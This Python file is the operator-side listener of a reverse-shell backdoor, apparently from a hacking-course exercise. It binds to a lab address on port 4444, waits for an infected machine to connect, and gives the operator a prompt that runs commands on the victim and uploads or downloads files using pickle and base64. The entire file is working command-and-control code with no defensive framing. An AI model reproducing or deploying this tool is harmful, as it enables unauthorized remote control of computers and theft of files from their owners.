from os import path
import socket
import pickle
import struct
import base64


class Listen:
    def __init__(self,ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        #enables to reuse sockets if connection is lost.

        listener.bind((ip, port))
        listener.listen(0)
        print ("[+] Waiting for connection...")
        self.connection, self.address = listener.accept()
        print (f"[+] Got a connection from {self.address}")

    def send_data(self, data):
        serialized_data = pickle.dumps(data)
        self.connection.sendall(struct.pack('>I', len(serialized_data)))
        self.connection.sendall(serialized_data)
    
    def receive_data(self):
        data_size = struct.unpack('>I', self.connection.recv(4))[0]
        received_payload = b""
        reamining_payload_size = data_size
        while reamining_payload_size != 0:
            received_payload += self.connection.recv(reamining_payload_size)
            reamining_payload_size = data_size - len(received_payload)
        data = pickle.loads(received_payload)
        return data
    
    def read_files(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self,path, content):
        with open(path, 'wb') as file:
            final_content = (base64.b64decode(content))
            file.write(final_content)
            return "[+] Download succesfull!"

    def execute(self, data):
        self.send_data(data)
        if data[0] == "exit":
            self.connection.close()
            exit()
        else:
            recived_msg =  self.receive_data()
            return recived_msg

    
    def start(self):
        while True:
            send_data = input('>> ')
            send_data = send_data.split(' ')
            try:
                if send_data[0] == 'upload':
                    file_content = self.read_files(send_data[1])
                    send_data.append(file_content)

                result = self.execute(send_data)
                if isinstance(result, str):
                    final_result = result
                else:
                    final_result = result.decode()
                    
                if send_data[0] == "download" and "[-] Error" not in final_result:
                    final_result = self.write_file(send_data[1],final_result)
            
            except Exception as e:
                final_result = f"1[-] Error during command excecution! \n Error: {e}"

            print (final_result)


listen_connection = Listen("192.168.23.128",4444)
listen_connection.start()
